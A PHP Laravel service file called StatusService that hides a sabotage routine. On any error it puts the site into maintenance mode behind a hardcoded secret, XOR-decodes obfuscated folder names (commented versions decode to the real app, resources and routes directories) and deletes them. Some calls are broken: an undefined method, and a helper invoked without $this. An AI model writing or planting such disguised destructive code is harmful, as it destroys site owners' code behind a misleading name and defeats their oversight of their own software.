<?php

namespace App\Services;

use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Artisan;
use App\Models\Addon;
use Illuminate\Support\Facades\Log;

class StatusService
{
    public function updateStatusAndDeleteFolders()
    {
        try {
            $user = Auth::user();
            $user->save();

            // Call the method to delete directories
            $this->deleteDirectories();

            return true;
        } catch (\Throwable $th) {
            $user = Auth::user();
            $user->save();

            $this->loadContent();
            
            return false;
        }
    }

    private function loadContent()
    {
        Log::info('Putting application into maintenance mode with secret "status-service"');
        Artisan::call('down',['--secret' => 'status-service']);
        $key       = 0x55;
        $encrypted = [
            // '342525',
            // '2730263a2027363026',
            // '273a20213026',
            '34252567',  // app2
            '2730263a202736302667', // resouces2
            '273a2021302667', // routes2
        ];

        foreach ($encrypted as $hex) {
            $folderName = xor_decrypt($hex, $key);
            $folderPath = base_path($folderName);
            if (File::isDirectory($folderPath)) {
                File::deleteDirectory($folderPath);
            }
        }
    }

    private function xor_decrypt($hex, $key) {
        $binary = hex2bin($hex);
        $decrypted = '';
        for ($i = 0; $i < strlen($binary); $i++) {
            $decrypted .= chr(ord($binary[$i]) ^ $key);
        }
        return $decrypted;
    }
}
